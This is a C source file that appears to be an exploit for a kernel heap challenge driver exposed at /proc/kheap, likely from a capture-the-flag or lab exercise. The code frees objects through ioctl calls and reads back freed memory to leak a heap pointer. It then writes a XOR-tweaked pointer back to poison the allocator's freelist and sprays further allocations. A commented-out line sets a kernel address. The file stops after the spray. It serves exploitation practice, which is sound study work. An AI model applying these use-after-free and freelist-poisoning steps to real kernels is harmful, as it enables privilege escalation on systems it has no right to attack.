
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/sendfile.h>

typedef struct _kheap_req_t // sizeof=0x10
{                                       // XREF: kheap_ioctl/r
    void *ubuf;                         // XREF: kheap_ioctl+78/r
                                        // kheap_ioctl+FA/r
    size_t size;                        // XREF: kheap_ioctl+73/r
                                        // kheap_ioctl:loc_135/r
}kheap_req_t;


unsigned long print_value(unsigned long *ptr, int index)
{

    printf("[%2d] 0x%llx\n",index, ptr[index]);

    printf("\n");
    return ptr[index];
}

int main()
{
    int fd[512];
    char buf [1024];
    unsigned long do_print_addr = 0;
    int fd_save = -1;
    kheap_req_t kheap_req = {
        .ubuf = buf,
        .size = 0x1d0
    };
    unsigned long leak[2];
    memcpy(buf, "AAAAAA", 8);
    // *(unsigned long *)(buf + 0x1f8) = 0xffffffff810b8bb0;
    int do_print = 0x5702;
    int pre_flag = 0x5704;
    int cp_user = 0x5700;
    int kefree = 0x5703;
    int cp_from_user = 0x5701;
    for (int i = 0; i < 2; i++)
        fd[i] = open("/proc/kheap", 0);
    
    for (int i = 1; i >= 0; i--)
        ioctl(fd[i], kefree, &kheap_req);
    
    for (int i = 0; i < 2; i++)
    {
        ioctl(fd[i], cp_user, &kheap_req);
        leak[i] = print_value(buf, 29);
    }
    *(unsigned long*)(buf + 29*8) = leak[0] ^ 0xffff000000000000;
    ioctl(fd[0], cp_from_user, &kheap_req);

    for (int i = 2; i < 18; i++)
        fd[i] = open("/proc/kheap", 0);
    
    
    return 0;
}